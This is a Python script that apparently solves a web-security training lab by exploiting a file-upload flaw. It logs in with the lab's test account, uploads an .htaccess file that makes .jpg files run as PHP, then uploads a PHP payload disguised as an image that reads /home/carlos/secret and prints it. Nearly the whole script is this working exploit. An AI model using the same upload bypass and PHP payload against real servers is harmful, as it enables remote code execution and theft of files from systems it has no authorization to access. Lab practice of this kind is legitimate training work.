from curl_cffi import requests
from curl_cffi.curl import CurlMime
from urllib.parse import urljoin
from bs4 import BeautifulSoup

base_url = input('Enter your lab url: ')
login_url = urljoin(base_url, '/login')

account = {
    'username': 'wiener',
    'password': 'peter'
}

s = requests.Session(impersonate="chrome142")

def login() -> requests.Response:
    print(f"[+] Logging into {account['username']}:{account['password']}")
    r = s.get(login_url)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_input = soup.find("input", {'name':'csrf'})
    payload = {}
    if csrf_input:
        token = csrf_input['value']
        payload['csrf'] = token
    for k in account: payload[k] = account[k]
    r = s.post(login_url, data=payload, allow_redirects=False)
    if r.status_code == 200:
        print (f"[-] Logged into {account['username']}:{account['password']} failed!!!")
        return None
    elif r.status_code == 302:
        print (f"[+] Logged into {account['username']}:{account['password']} successfully!!!")
        redirect_path = r.headers.get('Location')
        print (f"Redirecting to {redirect_path}")
        r = s.get(urljoin(base_url, redirect_path))
        return r 

def package_mime(file_name: str, payload: dict) -> CurlMime:
    cm = CurlMime()
    if ".htaccess" == file_name:
        data = "AddType application/x-httpd-php .l33t .jpg"
        content_type = "text/plain"
    else:
        data = "<?php echo file_get_contents('/home/carlos/secret'); ?>"
        content_type = "image/jpeg"
    cm.addpart(
        name= 'avatar',
        filename=file_name,
        content_type=content_type,
        data=data
    )
    for key,value in payload.items():
        cm.addpart(
            name=key,
            data=str(value).encode('utf-8')
        )
    return cm

def upload_file(site: requests.Response):
    soup = BeautifulSoup(site.text, 'html.parser')
    upload_path = soup.find("form", {'id':'avatar-upload-form'})['action']
    upload_url = urljoin(base_url, upload_path)
    csrf_input = soup.find('input', {'name': 'csrf'})
    payload ={}
    if csrf_input:
        token = csrf_input['value']
        payload['csrf'] = token
    payload['user'] = account['username']
    file_name = '.htaccess'
    multipart_data = package_mime(file_name, payload)
    r = s.post(upload_url, multipart=multipart_data)
    print(r.text)
    file_name = 'test_avatar.jpg'
    multipart_data = package_mime(file_name, payload)
    r = s.post(upload_url, multipart=multipart_data)
    print(r.text)
    soup = BeautifulSoup(r.text, 'html.parser')
    r = s.get(urljoin(base_url, soup.find('a')['href']))
    soup = BeautifulSoup(r.text, 'html.parser')
    r = s.get(urljoin(base_url, soup.find('a')['href']))
    file_path = soup.find('img', class_='avatar')['src']
    file_url = urljoin(base_url, file_path)
    r = s.get(file_url)
    print (r.text)

if __name__ == "__main__":
    site = login()
    if site:
        upload_file(site)